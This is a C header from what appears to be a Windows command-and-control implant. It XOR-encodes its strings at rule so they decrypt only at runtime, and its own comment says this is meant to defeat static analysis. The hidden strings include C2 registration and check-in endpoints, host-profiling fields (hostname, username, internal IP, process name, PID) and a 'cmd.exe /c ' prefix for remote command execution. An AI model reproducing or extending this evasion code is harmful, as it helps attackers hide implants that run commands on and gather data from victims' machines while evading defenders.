#ifndef _STRINGS_H
#define _STRINGS_H

#include "common.h"

// =============================================
// Runtime XOR string encryption
//
// All sensitive strings stored XOR'd in binary.
// DecryptString() decrypts in-place before use.
// ZeroString() wipes plaintext from memory after use.
//
// Prevents static analysis from finding:
//   /api/v1/auth, agent_id, hostname, cmd.exe, etc.
// =============================================

#define STR_XOR_KEY     0x4D

static inline PCHAR DecryptString(PCHAR pEncStr, DWORD dwLen) {
    for (DWORD i = 0; i < dwLen; i++)
        pEncStr[i] ^= STR_XOR_KEY;
    return pEncStr;
}

static inline VOID ZeroString(PCHAR pStr, DWORD dwLen) {
    SecureZeroMemory(pStr, dwLen);
}

// "/api/v1/auth" (12 bytes)
#define ENC_REGISTER_URI_LEN       12
static CHAR g_EncRegisterURI[] = { 0x62, 0x2C, 0x3D, 0x24, 0x62, 0x3B, 0x7C, 0x62, 0x2C, 0x38, 0x39, 0x25, 0x00 };

// "/api/v1/status" (14 bytes)
#define ENC_CHECKIN_URI_LEN        14
static CHAR g_EncCheckInURI[] = { 0x62, 0x2C, 0x3D, 0x24, 0x62, 0x3B, 0x7C, 0x62, 0x3E, 0x39, 0x2C, 0x39, 0x38, 0x3E, 0x00 };

// "agent_id" (8 bytes)
#define ENC_AGENT_ID_LEN           8
static CHAR g_EncAgentId[] = { 0x2C, 0x2A, 0x28, 0x23, 0x39, 0x12, 0x24, 0x29, 0x00 };

// "hostname" (8 bytes)
#define ENC_HOSTNAME_LEN           8
static CHAR g_EncHostname[] = { 0x25, 0x22, 0x3E, 0x39, 0x23, 0x2C, 0x20, 0x28, 0x00 };

// "username" (8 bytes)
#define ENC_USERNAME_LEN           8
static CHAR g_EncUsername[] = { 0x38, 0x3E, 0x28, 0x3F, 0x23, 0x2C, 0x20, 0x28, 0x00 };

// "results" (7 bytes)
#define ENC_RESULTS_LEN            7
static CHAR g_EncResults[] = { 0x3F, 0x28, 0x3E, 0x38, 0x21, 0x39, 0x3E, 0x00 };

// "process_name" (12 bytes)
#define ENC_PROCESS_NAME_LEN       12
static CHAR g_EncProcessName[] = { 0x3D, 0x3F, 0x22, 0x2E, 0x28, 0x3E, 0x3E, 0x12, 0x23, 0x2C, 0x20, 0x28, 0x00 };

// "internal_ip" (11 bytes)
#define ENC_INTERNAL_IP_LEN        11
static CHAR g_EncInternalIp[] = { 0x24, 0x23, 0x39, 0x28, 0x3F, 0x23, 0x2C, 0x21, 0x12, 0x24, 0x3D, 0x00 };

// "Content-Type: application/json" (30 bytes)
#define ENC_CONTENT_TYPE_LEN       30
static CHAR g_EncContentType[] = { 0x0E, 0x22, 0x23, 0x39, 0x28, 0x23, 0x39, 0x60, 0x19, 0x34, 0x3D, 0x28, 0x77, 0x6D, 0x2C, 0x3D, 0x3D, 0x21, 0x24, 0x2E, 0x2C, 0x39, 0x24, 0x22, 0x23, 0x62, 0x27, 0x3E, 0x22, 0x23, 0x00 };

// "cmd.exe /c " (11 bytes)
#define ENC_CMD_EXE_LEN            11
static CHAR g_EncCmdExe[] = { 0x2E, 0x20, 0x29, 0x63, 0x28, 0x35, 0x28, 0x6D, 0x62, 0x2E, 0x6D, 0x00 };

// "os" (2 bytes)
#define ENC_OS_LEN                 2
static CHAR g_EncOs[] = { 0x22, 0x3E, 0x00 };

// "arch" (4 bytes)
#define ENC_ARCH_LEN               4
static CHAR g_EncArch[] = { 0x2C, 0x3F, 0x2E, 0x25, 0x00 };

// "pid" (3 bytes)
#define ENC_PID_LEN                3
static CHAR g_EncPid[] = { 0x3D, 0x24, 0x29, 0x00 };

// "\"data\":\"" (8 bytes) - JSON parse marker
#define ENC_DATA_MARKER_LEN        8
static CHAR g_EncDataMarker[] = { 0x6F, 0x29, 0x2C, 0x39, 0x2C, 0x6F, 0x75, 0x6F, 0x00 };

#endif // _STRINGS_H
